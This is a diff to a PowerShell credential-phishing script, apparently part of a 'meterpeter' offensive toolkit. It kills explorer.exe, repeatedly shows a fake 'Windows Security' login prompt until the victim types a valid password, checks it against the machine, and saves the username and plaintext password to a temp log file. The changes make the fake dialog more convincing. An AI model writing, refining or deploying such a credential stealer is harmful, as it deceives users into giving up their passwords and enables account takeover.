@@ -23,7 +23,6 @@
 #>
 
 
-$OSBuild = (Get-WmiObject Win32_OperatingSystem).Version
 taskkill /f /im explorer.exe
 $timestomp = $null
 $account = $null
@@ -40,7 +39,7 @@ while ($counter -lt '1000000000')
   $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
 	
   $account=[System.Security.Principal.WindowsIdentity]::GetCurrent().name
-  $credential = $host.ui.PromptForCredential("Build: $OSBuild - Credentials Required", "Please enter your username and password.", $Account, "NetBiosUserName")
+  $credential = $host.ui.PromptForCredential("Windows Security", "Please enter your username and password.", $Account, "NetBiosUserName")
   $validate = $DS.ValidateCredentials($account, $credential.GetNetworkCredential().password)
 
     $user = $credential.GetNetworkCredential().username;
@@ -48,17 +47,17 @@ while ($counter -lt '1000000000')
     If(-not($validate) -or $validate -eq $null)
     {
       $logpath = Test-Path -Path "$env:tmp\CredsPhish.log";If($logpath -eq $True){Remove-Item $env:tmp\CredsPhish.log -Force}
-      $msgbox = [System.Windows.Forms.MessageBox]::Show("Invalid Credentials, Please try again.", "$Account", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
+      $msgbox = [System.Windows.Forms.MessageBox]::Show("Invalid Credentials, Please try again ..", "$Account", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
     }else{
       $timestamp = Get-Date;
-      $msgbox = [System.Windows.Forms.MessageBox]::Show("Authentication Successful, UnLocking WorkStation.", "$Account", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
+      $msgbox = [System.Windows.Forms.MessageBox]::Show("Authentication Successful, UnLocking WorkStation ..", "$Account", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
       echo "" > $env:tmp\CredsPhish.log
       echo "meterpeter - CredsPhish" >> $env:tmp\CredsPhish.log
       echo "-----------------------" >> $env:tmp\CredsPhish.log
       echo "TimeStamp : $timestamp" >> $env:tmp\CredsPhish.log
       echo "username  : $user" >> $env:tmp\CredsPhish.log
       echo "password  : $pass" >> $env:tmp\CredsPhish.log
-      start explorer.exe
+      Start-Process -FilePath $env:windir\explorer.exe
       exit
     }
   $counter++
